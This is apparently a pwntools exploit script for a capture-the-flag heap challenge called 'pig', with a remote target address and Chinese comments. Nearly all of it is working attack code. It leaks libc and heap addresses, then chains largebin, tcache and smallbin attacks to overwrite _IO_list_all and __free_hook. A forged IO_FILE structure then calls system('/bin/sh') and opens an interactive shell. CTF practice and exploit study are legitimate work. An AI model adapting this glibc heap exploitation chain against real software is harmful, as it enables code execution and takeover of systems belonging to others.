# -*- coding: utf-8 -*-
from pwn import *
#from LibcSearcher import *
from libformatstr import FormatStr
context.log_level = 'debug'
context.terminal=['tmux','splitw','-h']
context(arch='amd64', os='linux')
# context(arch='i386', os='linux')
local = 1
elf = ELF('./pig')
if local:
    p = process('./pig')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('116.85.48.105',5005)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))

def debug(mallocr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+mallocr)))
    else:
        gdb.attach(p,"b *{}".format(hex(mallocr)))


def add(size,content):
    ru('Choice: ')
    sl('1')
    ru("Input the message size: ")
    sl(str(size))
    ru("message: ")
    sl(content)
def free(index):
    ru('Choice: ')
    sl('4')
    ru("Input the message index: ")
    sl(str(index))
def edit(index,content):
    ru('Choice: ')
    sl('3')
    ru("Input the message index: ")
    sl(str(index))
    ru("message: ")
    sd(content)
def show(index):
    ru('Choice: ')
    sl('2')
    ru("Input the message index: ")
    sl(str(index))

def change(user):
    ru('Choice: ')
    sl('5')
    if user == 1:
        sla('user:\n','A\x01\x95\xc9\x1c')
    elif user == 2:
        sla('user:\n','B\x01\x87\xc3\x19')
    elif user == 3:
        sla('user:\n','C\x01\xf7\x3c\x32')

change(2)

for i in range(5):
	add(0x90,'a'*0x28)
	free(i)

change(1)
add(0x150,'a'*0x68)
for i in range(7):
	add(0x150,'a'*0x68)
	free(i+1)
free(0)
change(2)
add(0xb0,'a'*0x28)

change(1)
add(0x180,'a'*0x78) #malloc consolidate

for i in range(7):
	add(0x180,'a'*0x78)
	free(9+i)
free(8)
change(2)
add(0xe0,'a'*0x38)
change(1)
add(0x430,'a'*0x158)
# debug(0)
change(2)
add(0xf0,'a'*0x48)
change(1)
free(16)
change(2)
add(0x440,'a'*0x158)
change(1)
show(16)
ru('message is: ')
malloc_hook = u64(rc(6).ljust(8,'\x00'))-0x470
libc_base = malloc_hook - libc.sym["__malloc_hook"]
lg('libc_base')

main_arena = malloc_hook+0x4a0
ld_base = libc_base+0x1f7000
value = 0
ld_base = libc_base+0x100000+(value<<12)
print "ld_base--->"+hex(ld_base)
dl_fini = ld_base+0x10ce3
rtl_global = ld_base + 0x2b060
print "rtl_global--->"+hex(rtl_global)
fake_chunk=malloc_hook-0x23
mprotect=libc_base+libc.sym['mprotect']
free_hook=libc_base+libc.sym['__free_hook']
realloc=libc_base+libc.sym['realloc']
set_context = libc_base + libc.sym['setcontext']
ret = libc_base+0x000000000002535f
pop_rdi_ret = libc_base+0x0000000000026542
pop_rsi_ret = libc_base+0x0000000000026f9e
pop_rdx_ret = libc_base+0x000000000012bda6
read=libc_base+libc.sym['read']
jmp_rax=libc_base+0x26eb5
pop_rax_ret=libc_base+0x0000000000047cf8
system = libc_base+libc.sym["system"]
binsh = libc_base+libc.search("/bin/sh").next()
magic_gadget = libc_base + 0x00000000001547a0
syscall = libc_base + 0x00000000000bc3f5 
leave_ret = libc_base + 0x0000000000400b8c

edit(16,'k'*0xf+'\n')
show(16)
ru('k'*0xf+'\n')
# ru('message is: '+'A'*0xf)
heap_base = u64(rc(6).ljust(8,'\x00')) - 0x13940
lg('heap_base')
# debug(0)
edit(16, 2*p64(libc_base+0x1ebfe0) + '\n') # recover
add(0x430, 'A'*0x158) # A17
add(0x430, 'A'*0x158) # A18
add(0x430, 'A'*0x158) # A19
change(2)
free(8)
add(0x450,'b'*0x168)
change(1)
free(17)
change(2)
edit(8,p64(0)+p64(free_hook-0x28)+'\n')
change(3)
add(0xa0,'c'*0x28)#先入largebin再入unsortedbin
change(2)
edit(8,2*p64(heap_base+0x13e80)+'\n') #recover

change(3)
add(0x380,'c'*0x118)

change(1)
free(19)

change(2)
IO_list_all = libc_base + libc.sym['_IO_list_all']
edit(8, p64(0) + p64(IO_list_all-0x20) + '\n')

change(3)
add(0xa0, 'C'*0x28) # C2 triger largebin_attack, write a heap addr to _IO_list_all

change(2)
edit(8, 2*p64(heap_base+0x13e80) + '\n') # recover

change(1)
smallbin_fd = heap_base+0x12280
payload = 'N'*0x50 + p64(smallbin_fd) + p64(free_hook-0x20) #smallbin attack,保证供给成功，fd要还原
edit(8,payload + '\n')

change(3)
Fake_IO_FILE_Chain = heap_base+0x147c0
payload = '\x00'*0x18 + p64(Fake_IO_FILE_Chain)# largebin attack放入的(chunk地址+0x68位置处)需要写上fake_IO_FILE_chain地址
payload = payload.ljust(0x158, '\x00')
add(0x440, payload) # C3 change fake FILE _chain
add(0x90,'c'*0x28)

IO_str_jumps = libc_base + 0x1ED560 #_IO_str_jumps地址
system_addr = libc_base + libc.sym['system']
binsh_heap = heap_base+0x148a0
fake_IO_FILE = p64(0)
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(1)                    #change _IO_write_base = 1
fake_IO_FILE += p64(0xffffffffffff)        #change _IO_write_ptr = 0xffffffffffff
fake_IO_FILE += p64(0)
fake_IO_FILE += p64(binsh_heap)                #v4   binsh的地址
fake_IO_FILE += p64(binsh_heap+0x18)                #v5   
fake_IO_FILE = fake_IO_FILE.ljust(0xb0, '\x00')
fake_IO_FILE += p64(0)                    #change _mode = 0
fake_IO_FILE = fake_IO_FILE.ljust(0xc8, '\x00')
fake_IO_FILE += p64(IO_str_jumps)        #change vtable
payload = fake_IO_FILE + '/bin/sh\x00' + 2*p64(system_addr)
ru('Gift:')
sd(payload)
ru('Choice: ')
sl('5')
sla('user:\n','')

debug(0)
p.interactive()